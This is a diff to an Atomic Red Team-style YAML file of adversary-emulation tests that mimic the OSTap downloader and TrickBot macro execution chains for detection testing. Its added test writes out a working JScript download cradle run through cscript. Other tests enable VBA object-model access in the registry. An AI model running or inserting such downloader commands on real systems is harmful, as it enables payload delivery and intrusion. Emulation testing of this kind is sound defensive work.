@@ -7,8 +7,8 @@ atomic_tests:
   description: |
     This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. The .jse file in turn launches wscript.exe.
     Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
-    
-    This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns 
+
+    This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
     References:
       https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader
 
@@ -36,7 +36,7 @@ atomic_tests:
         Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
       prereq_command: |
         If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
-      get_prereq_command: | 
+      get_prereq_command: |
         $msword = New-Object -ComObject word.application
         Stop-Process -Name WINWORD
 
@@ -50,6 +50,32 @@ atomic_tests:
     cleanup_command: |
       if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
       Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+
+- name: OSTap Payload Download
+  description: |
+    Uses cscript //E:jscript to download a file
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    script_file:
+      description: File to execute jscript code from
+      type: Path
+      default: '%TEMP%\OSTapGet.js'
+    file_url:
+      description: URL to retrieve file from
+      type: Url
+      default: https://128.30.52.100/TR/PNG/iso_8859-1.txt
+
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
+      cscript //E:Jscript #{script_file}
+    cleanup_command: |
+      del #{script_file} /F /Q >nul 2>&1
 
 - name: Maldoc choice flags command execution
   description: |
@@ -75,7 +101,7 @@ atomic_tests:
         Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
       prereq_command: |
         If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
-      get_prereq_command: | 
+      get_prereq_command: |
         $msword = New-Object -ComObject word.application
         Stop-Process -Name WINWORD
 
@@ -91,7 +117,7 @@ atomic_tests:
 
 - name: OSTAP JS version
   description: |
-    Malicious JavaScript executing CMD which spaws wscript.exe //e:jscript 
+    Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
     Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
 
   supported_platforms:
@@ -109,7 +135,7 @@ atomic_tests:
     jse_path:
       description: jse file to execute with wscript
       type: Path
-      default: 'C:\Users\Public\art.jse' 
+      default: 'C:\Users\Public\art.jse'
 
   dependency_executor_name: powershell
   dependencies:
@@ -117,7 +143,7 @@ atomic_tests:
         Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
       prereq_command: |
         If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
-      get_prereq_command: | 
+      get_prereq_command: |
         $msword = New-Object -ComObject word.application
         Stop-Process -Name WINWORD
 
@@ -132,4 +158,3 @@ atomic_tests:
     cleanup_command: |
       if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
       Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
-    
